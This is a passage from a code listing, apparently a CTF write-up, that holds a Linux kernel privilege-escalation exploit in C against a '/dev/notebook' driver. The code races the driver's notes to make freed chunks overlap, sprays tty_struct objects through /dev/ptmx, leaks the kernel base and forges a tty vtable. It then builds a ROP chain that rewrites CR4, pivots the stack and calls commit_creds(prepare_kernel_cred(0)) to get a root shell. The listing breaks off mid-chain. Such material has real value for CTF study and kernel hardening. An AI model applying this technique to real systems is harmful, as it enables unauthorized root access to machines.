class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __USE_GNU</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;x86intrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sysinfo.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> uint64_t u_int64_t</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC 0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAP_ADDR 0x1000000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TTY_STRUCT_SIZE 0x2e0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SPRAY_ALLOC_TIMES 0x100</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> spray_fd[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">    <span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="type">int</span> (*install)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*remove)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span> (*open)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">    <span class="type">void</span> (*close)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">    <span class="type">void</span> (*shutdown)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*cleanup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span> (*write)(<span class="keyword">struct</span> tty_struct * tty,</span><br><span class="line">    <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *buf, <span class="type">int</span> count);</span><br><span class="line">    <span class="type">int</span> (*put_char)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">unsigned</span> <span class="type">char</span> ch);</span><br><span class="line">    <span class="type">void</span> (*flush_chars)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span> (*write_room)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span> (*chars_in_buffer)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span> (*ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">    <span class="type">long</span> (*compat_ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">    <span class="type">void</span> (*set_termios)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> ktermios * old);</span><br><span class="line">    <span class="type">void</span> (*throttle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">    <span class="type">void</span> (*unthrottle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">    <span class="type">void</span> (*stop)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*start)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*hangup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span> (*break_ctl)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> state);</span><br><span class="line">    <span class="type">void</span> (*flush_buffer)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*set_ldisc)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*wait_until_sent)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> timeout);</span><br><span class="line">    <span class="type">void</span> (*send_xchar)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">char</span> ch);</span><br><span class="line">    <span class="type">int</span> (*tiocmget)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span> (*tiocmset)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">set</span>, <span class="type">unsigned</span> <span class="type">int</span> clear);</span><br><span class="line">    <span class="type">int</span> (*resize)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> winsize *ws);</span><br><span class="line">    <span class="type">int</span> (*set_termiox)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> termiox *tnew);</span><br><span class="line">    <span class="type">int</span> (*get_icount)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">    <span class="keyword">struct</span> serial_icounter_struct *icount);</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">proc_fops</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> __attribute__((regparm(<span class="number">3</span>)))(*_commit_creds)(<span class="type">unsigned</span> <span class="type">long</span> cred);</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> __attribute__((regparm(<span class="number">3</span>))) (*_prepare_kernel_cred)(<span class="type">unsigned</span> <span class="type">long</span> cred);</span><br><span class="line"></span><br><span class="line">_commit_creds commit_creds = (_commit_creds) <span class="number">0xffffffff810a1420</span>;</span><br><span class="line">_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred) <span class="number">0xffffffff810a1810</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> commit_creds_addr=<span class="number">0</span>, prepare_kernel_cred_addr=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root</span><span class="params">()</span> &#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> user_cs;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> user_ss;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> user_sp;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> user_rflags;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">save_state</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line">        <span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line">        <span class="string">&quot;movq %%rsp, %2\n&quot;</span></span><br><span class="line">        <span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">        <span class="string">&quot;popq %3\n&quot;</span></span><br><span class="line">        : <span class="string">&quot;=r&quot;</span>(user_cs), <span class="string">&quot;=r&quot;</span>(user_ss), <span class="string">&quot;=r&quot;</span>(user_sp), <span class="string">&quot;=r&quot;</span>(user_rflags)</span><br><span class="line">        :</span><br><span class="line">        : <span class="string">&quot;memory&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> *argv[] = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">  <span class="type">char</span> *envp[] = &#123;<span class="literal">NULL</span>&#125;;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+] Win!&quot;</span>);</span><br><span class="line">  execve(<span class="string">&quot;/bin/sh&quot;</span>, argv, envp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span>&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> idx;</span><br><span class="line">    <span class="type">uint64_t</span> size;</span><br><span class="line">    <span class="type">char</span>* buf;</span><br><span class="line">&#125;Userarg;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> note;</span><br><span class="line">    <span class="type">uint64_t</span> size;</span><br><span class="line">&#125;Node;</span><br><span class="line"></span><br><span class="line">Userarg arg;</span><br><span class="line">Node note[<span class="number">0x10</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> ko_base = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">gift</span><span class="params">(<span class="type">uint64_t</span> fd,<span class="type">char</span>* buf)</span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;arg, <span class="number">0</span>, <span class="keyword">sizeof</span>(Userarg));</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0xcc</span>, <span class="number">0</span>);</span><br><span class="line">    arg.buf = buf;</span><br><span class="line">    <span class="keyword">return</span> ioctl(fd,<span class="number">100</span>,&amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">uint64_t</span> fd,<span class="type">uint64_t</span> idx,<span class="type">uint64_t</span> size,<span class="type">char</span>* buf)</span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;arg, <span class="number">0</span>, <span class="keyword">sizeof</span>(Userarg));</span><br><span class="line">    arg.idx = idx;</span><br><span class="line">    arg.size = size;</span><br><span class="line">    arg.buf = buf;</span><br><span class="line">    <span class="keyword">return</span> ioctl(fd,<span class="number">0x100</span>,&amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">del</span><span class="params">(<span class="type">uint64_t</span> fd,<span class="type">uint64_t</span> idx)</span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;arg, <span class="number">0</span>, <span class="keyword">sizeof</span>(Userarg));</span><br><span class="line">    arg.idx = idx;</span><br><span class="line">    <span class="keyword">return</span> ioctl(fd,<span class="number">0x200</span>,&amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">edit</span><span class="params">(<span class="type">uint64_t</span> fd,<span class="type">uint64_t</span> idx,<span class="type">uint64_t</span> size,<span class="type">char</span>* buf)</span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;arg, <span class="number">0</span>, <span class="keyword">sizeof</span>(Userarg));</span><br><span class="line">    arg.idx = idx;</span><br><span class="line">    arg.size = size;</span><br><span class="line">    arg.buf = buf;</span><br><span class="line">    <span class="keyword">return</span> ioctl(fd,<span class="number">0x300</span>,&amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> kallsyms_fd = open(<span class="string">&quot;/tmp/moduleaddr&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    read(kallsyms_fd,buf,<span class="number">24</span>);</span><br><span class="line">    <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    read(kallsyms_fd,hex,<span class="number">18</span>);</span><br><span class="line">    <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;ko_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ko_base addr: %#lx\n&quot;</span>, ko_base);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> vmlinux_base = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="type">size_t</span> raw_do_tty_hangup = <span class="number">0xffffffff815af980</span>; </span><br><span class="line"><span class="type">size_t</span> raw_commit_creds = <span class="number">0xffffffff810a9b40</span>; </span><br><span class="line"><span class="type">size_t</span> raw_prepare_kernel_cred = <span class="number">0xffffffff810a9ef0</span>;</span><br><span class="line"><span class="type">size_t</span> raw_regcache_mark_dirty = <span class="number">0xffffffff816405b0</span>;</span><br><span class="line"><span class="type">size_t</span> raw_x64_sys_chmod = <span class="number">0xffffffff81262280</span>;</span><br><span class="line"><span class="type">size_t</span> raw_msleep = <span class="number">0xffffffff81102360</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> raw_pop_rdi = <span class="number">0xffffffff81007115</span>; <span class="comment">//pop rdi; ret;</span></span><br><span class="line"><span class="type">size_t</span> raw_pop_rdx = <span class="number">0xffffffff81358842</span>; <span class="comment">//pop rdx; ret;</span></span><br><span class="line"><span class="type">size_t</span> raw_pop_rcx = <span class="number">0xffffffff812688f3</span>; <span class="comment">//pop rcx; ret;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//0xffffffff8250747f : mov rdi, rax ; call rdx</span></span><br><span class="line"><span class="comment">//0xffffffff8147901d : mov rdi, rax ; ja 0xffffffff81479013 ; pop rbp ; ret</span></span><br><span class="line"><span class="comment">//size_t raw_mov_rdi_rax = 0xffffffff8195d1c2; //mov rdi, rax; cmp r8, rdx; jne 0x2cecb3; ret; </span></span><br><span class="line"><span class="type">size_t</span> raw_mov_rdi_rax = <span class="number">0xffffffff8147901d</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> raw_pop_rax = <span class="number">0xffffffff81540d04</span>;<span class="comment">//pop rax; ret;</span></span><br><span class="line"><span class="type">size_t</span> raw_mov_rdi_rbx = <span class="number">0xffffffff824f6a4c</span>; <span class="comment">//mov rdi, rbx; call rax;</span></span><br><span class="line"><span class="type">size_t</span> raw_pop_rsi = <span class="number">0xffffffff8143438e</span>; <span class="comment">//pop rsi; ret;</span></span><br><span class="line"><span class="type">size_t</span> raw_push_rax =  <span class="number">0xffffffff81035b63</span>;<span class="comment">//push rax; ret;</span></span><br><span class="line"><span class="type">size_t</span> raw_pop_rdi_call = <span class="number">0xffffffff81f0b51c</span>; <span class="comment">//pop rdi; call rcx;</span></span><br><span class="line"><span class="type">size_t</span> raw_xchg_eax_esp  = <span class="number">0xffffffff8101d247</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//这里注意一定要使用这个gadget去维持栈平衡</span></span><br><span class="line"><span class="comment">//0xffffffff81063710 : push rbp ; mov rbp, rsp ; mov cr4, rdi ; pop rbp ; ret</span></span><br><span class="line"><span class="type">size_t</span> raw_mov_cr4_rdi = <span class="number">0xffffffff81063710</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">base_add</span><span class="params">(<span class="type">size_t</span> addr)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> addr - raw_vmlinux_base + vmlinux_base;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    find_symbols();</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/dev/notebook&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open notebook error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">fake_tty_operations</span> =</span> (<span class="keyword">struct</span> tty_operations *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> tty_operations));</span><br><span class="line"></span><br><span class="line">    save_state();</span><br><span class="line">    <span class="built_in">memset</span>(fake_tty_operations, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> tty_operations));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">START:</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        del(fd,i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//偶数id 用来申请0x2e0的chunk</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i+=<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        edit(fd, i, <span class="number">0x2e0</span>, <span class="string">&quot;will&quot;</span>);   </span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    <span class="type">pid_t</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (!pid)</span><br><span class="line">    &#123;</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i+=<span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            edit(fd, i, <span class="number">0</span>, <span class="number">0</span>);  <span class="comment">//triggle sleep from page fault</span></span><br><span class="line">            sleep(<span class="number">0.1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">0x10</span>;i+=<span class="number">2</span>)&#123;</span><br><span class="line">            gift(fd, buf);</span><br><span class="line">            <span class="keyword">while</span> (*(<span class="type">uint64_t</span> *)(buf + i * <span class="number">0x10</span> + <span class="number">8</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                gift(fd, buf);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//将被释放的偶数id的chunk 用奇数id申请回来, 有几率造成chunk overlap</span></span><br><span class="line">            edit(fd,i+<span class="number">1</span>,<span class="number">0x2e0</span>,<span class="string">&quot;temp&quot;</span>);  </span><br><span class="line">            edit(fd,i,<span class="number">0x2e0</span>,<span class="string">&quot;temp&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//存储所有的note</span></span><br><span class="line">        gift(fd, buf);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">0x10</span>;i++)&#123;</span><br><span class="line">            note[i].note = *(<span class="type">uint64_t</span> *)(buf + i * <span class="number">0x10</span>);</span><br><span class="line">            note[i].size = *(<span class="type">uint64_t</span> *)(buf + i*<span class="number">0x10</span> + <span class="number">8</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;note[%d] addr: %#lx , size: %d\n&quot;</span>, i, *(<span class="type">uint64_t</span> *)(buf + i * <span class="number">0x10</span>), *(<span class="type">uint64_t</span> *)(buf + i*<span class="number">0x10</span> + <span class="number">8</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//找到两个chunk overlap的id</span></span><br><span class="line">    <span class="type">int</span> x = <span class="number">-1</span>,y = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">0x10</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = i + <span class="number">1</span>;j &lt; <span class="number">0x10</span>;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (note[i].note == note[j].note &amp;&amp; note[i].note)&#123;</span><br><span class="line">                x = i;</span><br><span class="line">                y = j;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (x != <span class="number">-1</span> &amp;&amp; y != <span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//如果没找到,再来一遍</span></span><br><span class="line">    <span class="keyword">if</span> (x == <span class="number">-1</span> || y == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">goto</span> START;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;x idx : %d\n&quot;</span>,x);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;y idx : %d\n&quot;</span>,y);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//此时x和y指向同一块地址空间,释放y,可以用x 去write这块空间</span></span><br><span class="line">    del(fd,y);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//多次open保证tty占位</span></span><br><span class="line">    <span class="comment">//因为这里似乎有坑点，查看alloc_tty_struct函数发现，这里的tty大小是0x3a8</span></span><br><span class="line">    <span class="comment">//虽然0x3e8和0x2e0都是0x400的slab,但是单次申请不保证成功</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Spraying buffer with tty_struct&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SPRAY_ALLOC_TIMES; i++) &#123;</span><br><span class="line">        spray_fd[i] = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR | O_NOCTTY);</span><br><span class="line">        <span class="keyword">if</span> (spray_fd[i] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;open tty&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">char</span> tmp[<span class="number">0x2e0</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    read(fd,tmp,x);</span><br><span class="line">    <span class="keyword">if</span> (tmp[<span class="number">0</span>] != <span class="number">0x01</span> || tmp[<span class="number">1</span>] != <span class="number">0x54</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] tty_struct spray failed&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] We should have 0x01 and 0x54, instead we got %02x %02x\n&quot;</span>, buf[<span class="number">0</span>], buf[<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Exiting...&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//伪造一个tty vtable，id为y</span></span><br><span class="line">    <span class="type">char</span> tty_buf[<span class="number">0x200</span>] = &#123;<span class="number">0</span>&#125; ;</span><br><span class="line">    <span class="built_in">memcpy</span>(tty_buf, fake_tty_operations, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> tty_operations));</span><br><span class="line">    edit(fd,y, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> tty_operations), <span class="string">&quot;1&quot;</span>);</span><br><span class="line">    write(fd, tty_buf, y);</span><br><span class="line">    gift(fd, buf);</span><br><span class="line">    <span class="type">uint64_t</span> fake_vtable = *(<span class="type">uint64_t</span> *)(buf + <span class="number">0x10</span>*y);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//读出虚表地址,泄露内核地址 ; 并替换虚表为我们伪造的虚表 </span></span><br><span class="line">    <span class="type">uint64_t</span> *temp = (<span class="type">uint64_t</span>*)&amp;tmp[<span class="number">24</span>];</span><br><span class="line">    <span class="type">uint64_t</span> old_vtable = *temp;</span><br><span class="line">    *temp = fake_vtable;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;old vtable is %p\n&quot;</span>, old_vtable);</span><br><span class="line">    write(fd,tmp,x);</span><br><span class="line">    vmlinux_base   = old_vtable - <span class="number">0xe8e440</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kerbel base is %p\n&quot;</span>, vmlinux_base);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//在用户空间mmap 一块切栈后的地址空间</span></span><br><span class="line">    <span class="type">size_t</span> xchg_eax_esp = base_add(raw_xchg_eax_esp);</span><br><span class="line">    <span class="type">size_t</span> base = xchg_eax_esp &amp; <span class="number">0xfffff000</span>;</span><br><span class="line">    <span class="type">void</span> *map_addr = mmap((<span class="type">void</span> *)base,<span class="number">0x3000</span>,<span class="number">7</span>,MAP_PRIVATE | MAP_ANONYMOUS,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(base != (<span class="type">uint64_t</span>)map_addr)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;mmap failed!n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//将fake_vtable中的ioctl函数替换为raw_regcache_mark_dirty函数(one gadget --&gt; two gadget)</span></span><br><span class="line">    fake_tty_operations-&gt;ioctl = base_add(raw_regcache_mark_dirty);</span><br><span class="line">    <span class="built_in">memset</span>(tty_buf,<span class="number">0</span>,<span class="number">0x200</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(tty_buf, fake_tty_operations, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> tty_operations));</span><br><span class="line">    write(fd, tty_buf, y);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    *((<span class="type">uint64_t</span> *)(tmp)+<span class="number">0x20</span>/<span class="number">8</span>+<span class="number">3</span>) = base_add(raw_mov_cr4_rdi);  <span class="comment">//lock</span></span><br><span class="line">    *((<span class="type">uint64_t</span> *)(tmp)+<span class="number">0x28</span>/<span class="number">8</span>+<span class="number">3</span>) = xchg_eax_esp; <span class="comment">//unlock</span></span><br><span class="line">    *((<span class="type">uint64_t</span> *)(tmp)+<span class="number">0x30</span>/<span class="number">8</span>+<span class="number">3</span>) = <span class="number">0x6f0</span>;  <span class="comment">//lock_arg ; rdi</span></span><br><span class="line">    